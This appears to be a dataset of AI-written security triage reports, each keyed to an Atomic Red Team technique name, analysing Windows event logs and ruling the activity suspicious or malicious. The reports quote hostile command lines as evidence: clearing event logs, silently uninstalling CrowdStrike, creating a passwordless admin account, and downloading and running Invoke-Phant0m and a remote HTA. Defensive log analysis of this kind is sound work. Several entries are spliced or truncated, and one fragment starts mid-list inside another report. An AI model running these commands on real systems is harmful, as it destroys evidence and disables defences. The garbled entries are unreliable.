Activate Windows NoTrayContextMenu Group Policy Feature,"After analyzing the provided event logs, I have identified several markers that indicate potentially suspicious activity that merits further investigation. Here's a detailed breakdown of the findings:

### Key Observations:

1. **Clearing of Event Logs:**
   - Wevtutil.exe is used multiple times by the user ""admin_test"" to clear event logs, such as `Microsoft-Windows-Sysmon`, `Application`, `System`, `Security`, and `Windows PowerShell`. The command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Application` and others indicate log clearing operations.
   - Corresponding `EventID 104` in the System log confirms the clearing of logs by user ""admin_test"".

2. **Registry Modification:**
   - There is an execution of `cmd.exe` with the command line adding a registry key: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v NoTrayContextMenu /t REG_DWORD /d 1 /f`.
   - This change could potentially disable the Tray Context Menu in Windows Explorer, which is not a typical administrative action and might be used to hinder user operations.

3. **Privilege Integrity Level:**
   - Processes, including wevtutil and those modifying the registry, are running with ""High"" integrity level, indicating elevated privileges.

4. **Time Change Events:**
   - `EventID 4616` indicates a system time change. This is generally logged as benign, but in combination with log clearing, it might suggest an attempt to manipulate event logs' timestamps.

5. **Processes Parented by Wsmprovhost.exe:**
   - Wsmprovhost.exe is seen as the parent process for several suspicious activities, which could indicate the system is being accessed remotely through WinRM (Windows Remote Management).

6. **Regular Microsoft Edge Update Processes:**
   - Multiple entries related to Microsoft Edge Updates are captured, which appears legitimate as part of normal software update activities under the user `NT AUTHORITY\SYSTEM`.

### Assessment:

- **Clearing event logs** and **modifying registry settings** without apparent legitimate reasons are typical behavior associated with malicious activity, such as covering tracks or preparing for further exploitation.

### Recommendation:

Given these observations, the resolution is **SUSPICIOUS**. This activity warrants further investigation to determine the user ""admin_test’s"" intentions and cross-verify with network logs or other security systems to confirm or rule out potential compromise. Investigation should focus on checking:
- The legitimacy of the admin_test user and their typical behavior.
- Any remote access or unexplained elevated permissions granted.
- Corresponding suspicious network activity.

Upon verification, take appropriate steps, which could include revoking permissions, conducting user interviews, and performing a sweep for malware presence."
Uninstall Crowdstrike Falcon on Windows,"The provided logs exhibit several indicators of potentially malicious activity. Here is a detailed analysis of the suspicious findings:

1. **Event Log Clearance**:
    - **Event ID 1102** (Security Log) and **Event ID 104** (System Log) denote the clearing of event logs. This action is usually a strong indicator of malicious intent as adversaries clear logs to cover their tracks.

2. **High Privileges Utilization**:
    - **Event ID 4672** shows Privileged Logon, granting SeDebugPrivilege, SeImpersonatePrivilege, and other high-level privileges to the SYSTEM account. While this activity is expected for SYSTEM processes, it should be related to normal administrative tasks rather than malicious activity.

3. **Process Execution**:
    - Multiple executions of **`wevtutil.exe`** with command line arguments indicating the clearing of logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, `cl ""Windows PowerShell""`). The use of `wevtutil` in this manner is suspicious since it's being used to clear different channels of logs.
    - Execution of **`powershell.exe`** with command line arguments that indicate the removal/uninstallation of software related to CrowdStrike, a popular EDR solution (`/repair /uninstall /quiet`). This is highly suspicious and indicates an attempt to disarm security tools.

4. **Powershell Command Execution**:
    - The PowerShell log indicates the execution of scripts designed to check the presence of the CrowdStrike agent and attempts to quietly uninstall it if detected.

5. **Suspicious Automation Tools**:
    - Execution of **`powershell.exe`** with a long and complex command that involves checking file path validity and signature authenticity for executing WindowsSensor.exe related to CrowdStrike might indicate an attempt at evasion or disabling EDR capabilities.

6. **Taskhostw.exe and Sppsvc.exe**:
    - Although these processes have legitimate uses, they are suspicious in coordination with log clearance and PowerShell invocation indicating an attempt to disguise or automate processes relating to lateral movement or maintenance of access.

**Assessment**: 
Based on these activities, especially the clearing of event logs, the execution pattern with excessive privileges, and attempts to remove EDR tools, the analysis strongly indicates an ongoing compromise with signs of active evasion techniques and potential privilege escalation.

**Threat/Risk**:
- Compromise of security defenses (EDR disablement).
- Covering tracks via log clearance.
- Potential lateral movement or persistence mechanisms.
  
**Guidance**:
- Immediately isolate the affected system (""Server002"") from the network to prevent lateral movement.
- Conduct a thorough forensic investigation on ""Server002"" to identify all compromised components.
- Review administrative accounts and privileges, especially concerning `admin_test` activities.
- Reset passwords for sensitive accounts and enable strict monitoring and alert mechanisms.

LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"Based on the detailed review of the logs provided, there are several key events that indicate potentially malicious activity:

### Anomalies and Suspicious Activities Identified:

1. **Log Clearing Events:**
   - The logs show multiple instances of the `wevtutil.exe` utility being used to clear event logs: System (EventID: 104), Application, Security (EventID: 1102), and Windows PowerShell. The user associated with these events is `admin_test`.
   - Clearing event logs can be a tactic used by attackers to cover their tracks after conducting malicious activities.

2. **PowerShell Script Execution:**
   - A PowerShell command executed with `powershell.exe & {New-ItemProperty ""\""HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\"""" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force}`. 
   - While the command itself seems to be altering registry settings related to user privacy experience, the lack of context and the timing along with event log clearing raises suspicion.

3. **Frequent Use of Elevated Command-Line Tools:**
   - We observe frequent and rapid succession of `wevtutil.exe` executions, which clears logs, and `whoami.exe` for privilege checks, potentially for determining current logged-in user context/admin privileges.

4. **Time Change Events:**
   - Several time change events occurred just before or during these operations, which may indicate an attempt to manipulate time-related security measures or further obfuscate logs.

### Indicators of Malicious Activity:

- **Event Log Clearing:** The use of `wevtutil.exe` by `admin_test` to clear various logs is a strong indicator of malicious intent, as this activity is often a deliberate attempt to remove traces of malicious activities.
  
- **PowerShell Execution in Conjunction with Log Clearing:** Executing PowerShell commands that change system settings followed by clearing of event logs strongly suggests an attempt to hide potentially malicious configurations or actions.

### Assessment and Resolution:

Based on these factors, I conclude the activities logged indicate potential malicious behavior. The repeated execution of commands that can alter system settings without clear justification, in conjunction with the clearing of event logs, cannot readily be explained as benign.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Containment and Response:**
   - Isolate the affected system (Server002) from the network to prevent the potential spread of malicious activities.
   - Collect volatile data as soon as possible to preserve evidence and investigate further.

4. **Strengthen Logging and Monitoring:**
   - Reinstate log collection and monitoring to prevent future unauthorized log clearances and ensure that more detailed data is available for potential future incidents.

5. **Review and Update Security Policies:**
   - Assess and update security policies regarding the use of powerful command line tools like PowerShell and `wevtutil`.
   - Implement strict controls and auditing for administrative actions to prevent misuse."
Delete System Logs Using Clear-EventLog,"Upon reviewing the provided event logs for potential indicators of malicious activity on the CEO's machine, some suspicious activities have been identified:

1. **Clearing Event Logs**: 
   - In the System log, Event ID 104 indicates that both ""System"" and ""Windows PowerShell"" logs were cleared by the user `admin_test`. This event suggests an attempt to cover tracks, which is commonly associated with malicious activity.

2. **Suspicious PowerShell Activity**:
   - The Sysmon log shows that `powershell.exe` was executed with a command to clear event logs (`Clear-EventLog -LogName $_`). This is further supported by the Windows PowerShell log, which denotes that a PowerShell session executed a command to manipulate event logs.
   - The use of PowerShell for clearing event logs without apparent legitimate reason is highly suspicious as it points to an attempt to delete evidence of prior actions.

3. **Network and Edge Updates**:
   - Various processes related to Microsoft Edge Update activities are present, which appear legitimate and align with regular software update mechanisms.
   - However, since they coincide closely with the PowerShell activity and log-clearing events, they warrant close scrutiny to ensure they haven't served as a vector for malicious payload distribution.

4. **Time Change Event**:
   - The Security log includes Event ID 4616 which indicates a time change being conducted by `svchost.exe`. While this can be legitimate, when combined with other suspicious activities, it raises a red flag as altering system time can be used to manipulate log timestamps.

**Assessment**:
- The combination of event log clearing, suspicious PowerShell usage, and concurrent system activities indicate at the very least, suspicious behavior that could imply malicious intent. The actions observed—clearing logs using PowerShell—are often employed by attackers to obfuscate their activities on a compromised machine.

**Resolution**: **MALICIOUS**

**Guidance**:
- Conduct a comprehensive threat hunt on the CEO's machine to determine the full extent of the compromise.
- Investigate any related network connections or files that might have been accessed or transferred during the timeframe.
- Review the integrity and intent of the Microsoft Edge Update service activities, ensuring they haven't acted as a cover for malicious operations.
- Reinforce logging and monitoring capabilities to avoid future incidents and to quickly detect such behaviors.

     - System log (EventID 104) was cleared by the same user `admin_test`.
   - Clearing of event logs can be indicative of an attempt to hide malicious activity.

2. **Unusual User Account Creation**:
   - A new local user was created named ""Administrator "" using a PowerShell command without a password:
     - `CommandLine`: `""powershell.exe"" & {New-LocalUser -Name \""\""Administrator \""\"" -NoPassword}`
   - This process was executed by `SERVER002\admin_test` with high integrity, suggesting elevated privileges were used.

3. **Time Manipulation**:
   - The logs show evidence of time being set backwards, which can be an attempt to defeat logs or other time-based security mechanisms (EventID 4616).

4. **Suspicious Command Executions**:
   - The `wevtutil.exe` command was used multiple times to clear various Windows logs (`CommandLine`: `""C:\Windows\system32\wevtutil.exe"" cl [LogName]`).
   - `whoami.exe` and `hostname.exe` execution without clear context or justification.

5. **Privilege Escalation**:
   - The user `admin_test` was involved in actions such as creating and enabling a user account, and modifying group memberships (EventID 4728, 4720, 4738).
   - All these were executed without the normal administrative oversight.

6. **Microsoft Edge Update Activities**:
   - Numerous events related to Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) were detected; however, these actions appear consistent with automatic updates. 

**Threats and Risks Identified**:
- The combination of log clearing, suspicious account creation, and privilege escalation suggests an attempt to compromise the system.
- These actions align with common attacker techniques for establishing persistence and disguising activity.

**Assessment**: Based on the evidence, the activity is classified as **MALICIOUS**, indicating a likely compromise of the system.

**Guidance on How to Proceed**:

Masquerade as a built-in system executable,"### Detailed Analysis of the Logs

**Suspicious or Anomalous Behavior:**

1. **PowerShell Activity:**
   - There are multiple PowerShell logs indicating execution. The command of interest involves defining a .NET type and compiling it to an executable `svchost.exe` in the `C:\Windows\Temp\` directory using `Add-Type`, followed by its execution. The command was initiated by the user `SERVER002\admin_test`.
   - This behavior is suspicious as it involves compiling and executing arbitrary code, which is a known technique for executing malware or conducting attacks. The executable being named `svchost.exe` is further suspicious as it mimics a legitimate Windows process to avoid detection.

2. **Sysmon Logs:**
   - The Sysmon logs show consistent activity related to PowerShell and come from the same user, `SERVER002\admin_test`. The compiled `svchost.exe` is executed from the Temp directory, corroborating the PowerShell activity.
   - Frequent execution of `wevtutil.exe` to clear event logs (`cl` argument) under the user `SERVER002\admin_test` suggests attempts to evade detection by clearing traces, which aligns with potential malicious behavior.
   
3. **System and Security Logs:**
   - The event logs for `System`, `Security`, and `Windows PowerShell` channels were cleared by the user `admin_test` shortly before or after the suspicious PowerShell activity. Clearing logs is a known tactic used by adversaries to hide their tracks and suggests nefarious activity.
   - Event 1102 in the Security log confirms the security log was cleared, and multiple entries in the System log show clearing of the respective logs, which indicates an attempt to cover tracks.

4. **Application Log:**
   - The `Windows Defender` logs indicate that the security product is active, but there should be concern that the malicious activity observed may have been an attempt to bypass or disable defenses.

**Assessment of the Situation:**

The combination of creating and executing a potentially malicious file disguised as a legitimate system process (`svchost.exe`), coupled with behavior to obscure actions (clearing of logs) and executed under an administrative account, strongly suggests malicious activity. This pattern of behavior is indicative of an attacker's presence on the system, potentially executing a payload or initiating a persistence mechanism.

**Threats or Risks Identified:**

- **Privilege Abuse:** The events occurred under what appears to be an administrative user account (`admin_test`) which holds high-level privileges. This increases the risk of deeper system compromise or lateral movement.
- **Potential Data Exfiltration or Execution of a Malicious Payload:** The compiled executable could be a delivery mechanism for further malicious scripts or data theft tools.
- **Persistence and Future Exploitation:** The adversary may have implanted mechanisms for persistence or is using this system as a pivot point.

**Guidance on How to Proceed:**

1. **Immediate Response:**
   - Isolate the affected machine to prevent potential lateral movement within the network.
   - Preserve the current state for forensic investigation, including acquiring disk and memory images.
   
2. **Investigate and Remediate:**
   - Analyze the `svchost.exe` created in the Temp directory to determine its functionality and intent.
   - Conduct a thorough investigation to identify any additional persistence mechanisms or indicators of compromise on this and other systems.
   - Review and enhance PowerShell logging and system monitoring capabilities to capture similar activities in the future.

3. **Review and Strengthen Security Posture:**
   - Conduct a privileged account audit to ensure stricter controls and monitoring.
   - Ensure the latest security updates and patches are applied across systems.
   - Reinforce user awareness training, focusing on the importance of recognizing and reporting suspicious activities.

**Resolution: MALICIOUS**

The behavior identified within the logs strongly indicates malicious activity, warranting classification as `MALICIOUS`. Immediate action is necessary to contain and investigate further, ensuring no further compromise within the organization's infrastructure."
Event Viewer Registry Modification - Redirection Program,"### Detailed Analysis

#### Log Analysis Overview

The logs provided belong to a Windows system and consist of various logs capturing different events, including Sysmon logs, Security logs, Application logs, and System logs. Each log captures certain system activities that provide insights into actions performed on the system, particularly by a user identified as `admin_test`. The objective is to ascertain any signs of malicious activity, especially in the context of an alert triggered by Endpoint Detection and Response (EDR) software on the CEO's machine.

#### Suspicious and Anomalous Activities
1. **Use of wevtutil.exe**: 
   - There are multiple entries of the `wevtutil.exe` command being executed. This utility is used for managing log files on Windows machines. The command lines observed are:
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl System`
     - `\""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""`
   - The `cl` flag (clear logs) is particularly concerning, especially across multiple important logs. It indicates log clearing activity, which could be an attempt to cover up malicious actions.

2. **Registry Modification via CMD**:
   - A command executed with `cmd.exe` is attempting to add a registry entry:
     - `reg add \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\"" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \""C:\\windows\\system32\\notepad.exe\"" /f`
   - Modifying registry keys associated with the event viewer is not a usual operation for legitimate processes and may indicate a persistence mechanism.

3. **Time Discrepancy**:
   - There's a discrepancy in system time adjustments within the security logs, showing timestamp changes quickly concerning event ID 4616, which entails a time change.
   - While sometimes benign, unexpected time changes warrant further examination as they can indicate attempts to misalign security logs.

4. **Clearing of Security Logs**:
   - Security logs and specific system logs were cleared, an action generally necessitating high system privileges.
   - Event ID 1102 in security logs indicates the security log was cleared by `admin_test`, making this action suspicious without proper authorization and pretext.

5. **Administrative Privileges and Network Activity**:
   - The user `admin_test` is shown with multiple elevated security privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are typically reserved for administrative tasks. 
   - The logon type `3` signifies a network logon, which suggests access was made over a network rather than locally, which could be unexpected based on typical user behavior.

#### Indicators of Malicious Activity or Compromise
- **Log Clearing**: Frequent log clearing is often indicative of attempts to cover traces of unauthorized or malicious behavior.
- **Registry Modifications**: Unusual registry operations like the creation of redirection mechanisms can point to malware trying to persist in the system.
- **Time Adjustments**: Slight manipulations of system time alongside other suspicious activities can further support the theory of illicit actions.

#### Conclusion

Based on the evaluation of these logs:
- **Resolution**: **MALICIOUS**

The evidence of cleared logs, particularly targeting PowerShell logs and the high-privileged user activities, along with dubious registry modifications, paint a clear picture of malicious intent or ongoing compromise. These actions require immediate attention.

#### Guidance on How to Proceed

1. **Immediate Isolation**: Remove the affected machine (Server002) from the network to prevent further spread or compromise.
2. **Forensic Analysis**: Engage digital forensics experts to retrieve deleted or cleared logs, if possible, for further analysis.
3. **Account Review**: Verify the legitimacy of the `admin_test` user actions and ensure no unauthorized access or escalated privileges were granted.
4. **Security Policies**: Reinforce security monitoring and account for events such as log alteration and administrative actions.
5. **Network Monitoring**: Look for any unusual outgoing connections from the affected host during the time frames identified.

The circumstances indicate a coordinated effort to obfuscate unauthorized activities on a critical asset in the organization. Immediate remedial measures are critical."
UACME Bypass Method 34,"### Detailed Analysis

Upon reviewing the provided logs across different systems, several suspicious activities indicate potential malicious actions. Below is the detailed assessment:

1. **Event Log Clearing:**
   - The System, Windows PowerShell, and Security logs have been cleared, as evidenced by Event ID 1102 (Security log) and Event ID 104 (System log). The user `admin_test` was involved in this activity. Log clearing is often a method to hide tracks after performing malicious activities, indicating serious suspicious behavior. 
   - The process `wevtutil.exe`, which is associated with clearing event logs, was initiated multiple times with high integrity (privileged) on the system by the user `SERVER002\admin_test`.

2. **Suspicious Command Execution:**
   - Execution of `C:\Windows\System32\cmd.exe` with command-line parameters pointing to a suspicious payload (`Akagi64.exe` located in a `Temp\AtomicRedTeam\..` directory). The usage of a temporary directory and unconventional file paths for execution is a sign of potentially malicious activities.
   - The hash associated with this command, `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`, should be further investigated against known malicious hashes databases.

3. **AtomicRedTeam and UACMe Tools:**
   - The presence of AtomicRedTeam and UACMe tool indicators suggest possible testing or exploitation techniques typically used for learning or malicious intents like privilege escalation.

4. **Process Execution and Parent-Child Relationships:**
   - Multiple processes are spawned from PowerShell and CMD, potentially orchestrating actions that evade detection. High-frequency spawning from `wsmprovhost.exe` and `cmd.exe` aligns with techniques used by adversaries during lateral movement or persistence setup.
   - Integrity levels for these processes are high, suggesting the user `admin_test` operates with elevated privileges.

5. **Microsoft Edge Update Processes:**
   - There is a high amount of activity related to Microsoft Edge Update processes, which may be benign; however, given the context of other suspicious activities, these processes should be examined to ensure they are not being leveraged for malicious actions like persistence or further payload delivery.

### Assessment and Guidance

Based on the analysis of logs, the findings suggest:
- **MALICIOUS** - The evidence of cleared log entries, suspicious process execution, and potential execution of known exploitation tools and techniques strongly indicate a likely malicious compromise or activity of a concerning nature.

### Recommended Actions

- **Immediate Isolation:** Isolate the host (Server002) from the network to prevent further lateral movement or data exfiltration.
- **Incident Response Activation:** Engage with the incident response team to handle potential breaches, validating if sensitive systems or data have been accessed.
- **Thorough Investigation:** Verify the hash `BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0` against threat intelligence databases.
- **User Account Review:** Examine the `admin_test` account for any unauthorized or irregular activity and consider resetting its credentials.
- **Forensic Imaging:** Create a forensic image of the system for deeper offline analysis and potential legal or compliance requirements.
- **System Hardening and Monitoring:** Ensure logging is reconfigured, and security monitoring is enhanced to prevent future occurrences, along with an audit of all administrative activities and roles."
Execution of program.exe as service with unquoted service path,"Upon reviewing the provided logs, several indicators of potentially malicious activity stand out, warranting a detailed breakdown:

1. **Event Log Clearing:**
   - **Security Log Event ID 1102**: The event log indicates that the ""admin_test"" user executed `wevtutil.exe` commands to clear Event Logs specific to the Application, Security, Windows PowerShell, and System logs. This can be malicious as attackers often clear logs to hide their traces.

2. **Suspicious Command Execution:**
   - **Sysmon Event ID 1**: The execution of `cmd.exe` with commands to copy `WindowsServiceExample.exe` to critical directories such as ""C:\\Program Files\\"" and start a service named ""Example Service"" is highly suspicious and indicative of malicious behavior. This aligns with techniques used in privilege escalation and persistence, specifically [T1574.009](https://attack.mitre.org/techniques/T1574/009/).
   - The creation and initiation of a service (Service Control Manager Event ID 7045 and 7000) designed to start automatically is a common technique for malware to maintain persistence upon system restarts.

3. **Timeline and Correlation:**
   - The timeline shows a pattern that suggests an attacker likely gained unauthorized access and manipulated scheduled tasks or used living-off-the-land binaries like wevtutil.exe, svchost.exe, and sc.exe to obfuscate and establish control over the system.

### Security Assessment and Recommendations:

- **Assessment**: The behavior observed in the logs is consistent with malicious activity. Specific actions, like clearing of logs, use of administrative commands to copy executables to system-critical directories, creation/starting of unnamed services, strongly suggest an active compromise.

- **Recommendation**:
  - Immediately isolate the affected system (Server002) to contain potential propagation.
  - Conduct memory and disk forensics to analyze for signs of compromise further.
  - Identify and scrutinize the ""admin_test"" account activities, revoking access if this is not expected behavior.
  - Review network traffic for indicators of lateral movement or data exfiltration.
  - Improve monitoring and alter configuration policies to alert deviations from typical usage of administrative tools.

**Resolution: MALICIOUS** - The logs contain clear evidence of malicious activity, with actions indicating a compromise aimed at gaining and maintaining unauthorized access."
Kill Event Log Service Threads,"After analyzing the provided Windows event logs, the following observations and conclusions can be drawn:

### Suspicious and Anomalous Behavior Detected:

1. **Clearing Event Logs:**
   - The logs show multiple instances of event log clearance by the user `admin_test` across different channels: System, Windows PowerShell, and Security logs. 
   - Clearing of logs is a common tactic used by attackers to cover their tracks and is highly suspicious.

2. **Time Manipulation:**
   - There are entries indicating that the system time was changed by the process `svchost.exe`. Altering system time is another red flag often associated with nefarious activities.

3. **Suspicious PowerShell Execution:**
   - The logs capture a PowerShell command executed by `admin_test` that downloads and executes a script from a remote URL: ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"".
   - The command modifies the execution policy, downloads a script, and executes it, which is indicative of an attempt to evade detection or perform some malicious actions.

4. **High Privilege Logon:**
   - The `admin_test` account appears to have been granted several high-level security privileges (e.g., SeDebugPrivilege, SeSecurityPrivilege) during the session, which could enable the execution of potentially malicious actions.

5. **Tool Used: Invoke-Phant0m:**
   - The script downloaded and executed is ""Invoke-Phant0m"", which is known to be associated with terminating Windows Event Logging Service, effectively disabling the generation of new logs.

6. **Misuse of Built-in Commands:**
   - Commands such as `wevtutil`, `whoami`, and `hostname` were executed, which can be part of reconnaissance activities during an attack.

### Assessment & Conclusion:

Based on the provided logs, there is clear evidence of malicious activity:
- The sequence of actions follows known tactics for evading detection — clearing logs, altering system time, and executing scripts to disable logging.
- The use of PowerShell to download and run potentially harmful scripts confirms intent to execute malicious activities.

By taking these actions, the organization can mitigate the impact of this malicious activity and reduce the risk of future incidents."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several elements suggest anomalous and potentially malicious behaviors. Below are the key findings:

1. **Clearing of Event Logs**:
    - **Security Log (EventID 1102)**: The security logs were cleared by the user `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006) on `2024-10-26 14:45:06 UTC`. This action is considered suspicious as it may be an attempt to cover tracks following unauthorized or suspicious actions.
    - **System Log (EventID 104)**: Similarly, the system and Windows PowerShell logs were cleared by `admin_test` on the same date and time. Clearing logs without a valid reason is often indicative of malicious intent.

2. **Powershell Execution**:
    - **Sysmon EventID 1**: `PowerShell` was executed with the command line `""powershell.exe -nop -Command Write-Host CustomAction export executed me; exit""`. The use of `-nop` (no profile) and customized commands can be characteristic of malware or scripts used to perform actions under the radar.

3. **Suspicious Installations**:
    - **MsiInstaller Events**: Installation of `T1218.007_DLL.msi` was performed. The directory `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\` and file naming suggest possible use of an Atomic Red Team test for system manipulation or exploitation. This test simulates adversary behavior, which could be permissible if performed for legitimate pen-testing; however, in an unauthorized context, it indicates potential malicious activity.
    - **Event RecordID 2384 and 2387** - These entries document the execution of the MSI installer in a manner that could be replication of known attack techniques, further flagging the activity as suspicious.

4. **Use of Wevtutil and Conhost**:
    - The frequent call to `wevtutil` for cleaning out events from different logs (Application, System, Security) is correlated with log clearing events. It appears to have been operated under the context of `admin_test`, being indicative of possible privilege misuse.
  
5. **Unusual Command Line Use**:
    - **Sysmon EventID 1 and 5**: Use of `conhost.exe` with unusual parameters and `wevtutil.exe` for log clearing suggests an attempt to maintain persistence and obscure actions which is typical in post-exploitation behaviors.

### Threat Assessment

Based on analysis, the logs showcase clear signs of potential malicious activity:
- The clearing of event logs indicates an attempt to erase any traces of potentially unauthorized access or activity.
- Execution of suspicious commands via PowerShell and potential exploitation using MSI installers suggest that adversaries might be leveraging built-in Windows utilities for nefarious purposes.
- Use of tactic-simulating tools, such as the one implied by directories and file names associated with known ATT&CK techniques, further point toward orchestration of activities aimed at security mechanism evasion.

### Guidance

The activities detected in these logs should be taken seriously:

1. **Resolution**: **MALICIOUS** - There is high confidence of malicious activity based on the evidence of event log clearance, unauthorized use of PowerShell, and suspicious program execution.
   
2. **Immediate Actions**:
   - **Investigate all access and changes** related to the user account `admin_test`. This should include confirming the legitimacy of all activities performed under this account.
   - **Forensic Analysis**: Perform full forensic acquisition of the affected systems to understand the scope of the compromise.
   - **Strengthen Monitoring & Alerts**: Establish detailed logging, monitoring, and anomaly detection to quickly identify similar events if they recur in the future.
   - **Review Security Policies**: Ensure that strict policies are in place to prevent unauthorized log clearing and misuse of admin privileges.

3. **Long-term Strategy**:
   - **User Awareness Training**: Increase awareness of potential risks employees may face from similar attacks, emphasizing cautious use of administration-level capabilities.
   - **Incident Response Drill**: Conduct regular incident response drills to prepare for eventualities where logs and systems may be compromised.

These steps aim to mitigate immediate threats and build resilience against future occurrences."
Mshta Executes Remote HTML Application (HTA),"Upon analyzing the provided Windows event logs, several patterns of potentially malicious activity have been noted. Here's a detailed breakdown with a focus on highlighted events:

1. **PowerShell Activity:**
   - The logs contain multiple entries involving `PowerShell.exe` with commands invoking `Invoke-WebRequest` to download a file from a GitHub URL, which is identified as part of the redcanaryco atomic red team tests.
   - The downloaded file is saved into the Startup folder as `T1218.005.hta`, a behavior associated with persistence mechanisms.
   - It uses `mshta.exe` to execute the HTA file, another indication of potentially malicious activities utilizing living-off-the-land binaries (LOLBins).
   - The script contains `start-sleep` and `stop-process -name ""calculator"" -Force`, which may indicate an attempt to stop a known process benignly, possibly for context obscuring.

2. **Event Log Clearing:**
   - The `wevtutil.exe` utility is used to clear event logs, with timestamps before PowerShell execution, pointing towards anti-forensics efforts.

3. **Process Creation Patterns:**
   - Entries for `mshta.exe` show it executing the HTA script from the Startup folder, confirming attempts to persist the payload.
   - `cmd.exe` entries executing `calc.exe` suggest a benign activity used as an evasion or mimicry tactic.

4. **Security and System Logs:**
   - Security logs show the clearing of logs by a user named `admin_test`, typically a suspicious action in a security context.
   - Time manipulation logs appear, though these particular entries alone are not inherently malicious, they do align with potential indicators when correlated with other suspicious logs.

5. **Microsoft Edge Update Activity:**
   - Significant entries from Sysmon logs indicate normal behavior relating to Microsoft Edge updating processes. Although these mostly align with software update processes, they occur in the timeframe of other suspicious activities.

**Assessment and Resolution:**
- The analysis of the PowerShell scripting, usage of LOLBins, and event log clearing strongly suggest unauthorized manipulation typical of malicious activity. Misuse of PowerShell and command execution within user directories further corroborates this.
- The user context (`admin_test`) alteration of settings, processes, combined with the script execution from a commonly abused GitHub repository highlights high-level tests often used in controlled Red Team assessments but could very well point to actual compromise if unattended.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**
1. Immediately isolate the host `Server002` from the network to prevent potential lateral movement or further data exfiltration.
2. Conduct a forensic analysis of the affected machine to retrieve more detailed evidence of the attack vector and any additional payloads or scripts.
3. Investigate user account (`admin_test`) for any signs of unauthorized access or privilege escalation.
4. Review Group Policy and endpoint detection settings to enhance monitoring and block scripts and binaries from suspicious domains.
5. Notify incident response teams to assess and manage any risk to other systems within the organization."
Windows - Modify file last access timestamp with PowerShell,"The provided logs reveal several activities that are potentially indicative of malicious behavior. Here's a breakdown of the suspicious activities:

1. **Log Clearance Events**: 
   - Multiple logs (System, Windows PowerShell, and Security channels) were cleared around the same time (15:08:03 UTC). These events were executed using the `wevtutil.exe` command, which is a legitimate tool but can be used for malicious purposes to cover tracks. The use of `wevtutil.exe` to clear log files is generally considered a suspicious action unless there is a legitimate administrative reason.

2. **PowerShell Activity**:
   - A PowerShell script was executed that included the command to manipulate the `LastAccessTime` of a file (`T1551.006_timestomp.txt`) to ""01/01/1970 00:00:00"". This technique of changing file timestamps is known as ""timestomping,"" commonly used by attackers to disguise unauthorized changes or hide the presence of malicious files.

3. **Usage of Atomic Red Team**:
   - The reference to `AtomicRedTeam` in the PowerShell script is notable. Atomic Red Team is a known open-source testing framework for simulating adversary behavior. While its presence in logs might indicate legitimate security testing, without explicit authorization or proper documentation, its sudden appearance is a red flag for potential compromise.

4. **Process and User Activity**:
   - The usage of tools like `whoami.exe` and `hostname.exe` could be seen as attempts to gather information about the host and the current user context. Although these tools are legitimate, their usage amidst other suspicious activities can bolster an argument for possible malicious intent.
   - The consistent user involved in these activities is `SERVER002\admin_test`, which might imply potential misuse of administrative credentials.

5. **High Integrity Level for Suspicious Actions**:
   - Actions carried out maintain a high integrity level, indicating they have been executed with administrative privileges, increasing the risk and potential impact of a malicious operation.

From this analysis, the combined evidence of log clearance, timestamp manipulation with PowerShell, and the context in which these tools were used provide strong indicators of malicious behavior. Given these facts, the actions as logged in the event files suggest potentially unauthorized activities designed to obfuscate malicious actions through log clearing and timestomping.

**Resolution**: MALICIOUS

**Guidance on how to proceed**:
- Immediately initiate a broader investigation to identify the source and extent of the compromise. This should include reviewing user account accesses, particularly focusing on the `admin_test` account.
- Perform a thorough security assessment of the system to determine if any unauthorized software or backdoors have been installed.
- Check for any other evidence of lateral movement or other compromised accounts within the network.
- Consider isolating affected systems from the network to prevent further unauthorized access or data exfiltration.
- Audit and review security policies to ensure proper logging and monitoring are enforced to detect such activities in the future.
- Engage the incident response team to manage the situation and mitigate any potential damage."
Disable Windows Error Reporting Settings,"Upon careful review and analysis of the provided logs, the following elements stand out as potentially suspicious or indicative of malicious activity:

1. **Event Log Cleared Actions**:
   - There are multiple instances in both the Security (`EventID: 1102`) and System logs (`EventID: 104`) where the event logs have been cleared. This is often a deliberate action taken to hide traces of malicious activity.
   - The account involved in these actions is `admin_test` on `SERVER002`, which suggests this account may have been compromised or improperly used.

2. **Privilege Escalation and Sensitive Privileges Used**:
   - `EventID: 4672` in the Security log indicates that the `admin_test` account was granted several sensitive privileges, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are commonly abused in attacks to escalate privileges or load malicious drivers.

3. **Unusual Command Execution**:
   - There are multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command targeting different logs (Sysmon, Application, Security, Windows PowerShell), which is consistent with an attacker wanting to cover their tracks.
   - A suspicious execution of `cmd.exe` with registry modification commands (`reg add`) that disable enhanced notifications for Windows Defender, potentially signaling an attempt to weaken security defenses on the host.

4. **Time and System Anomalies**:
   - There are time change events (`EventID: 4616`) logged, altering the system time. This can sometimes be employed to disrupt time-stamped log analysis or to align the system time with attacker tools.

5. **Processes with High Integrity Levels**:
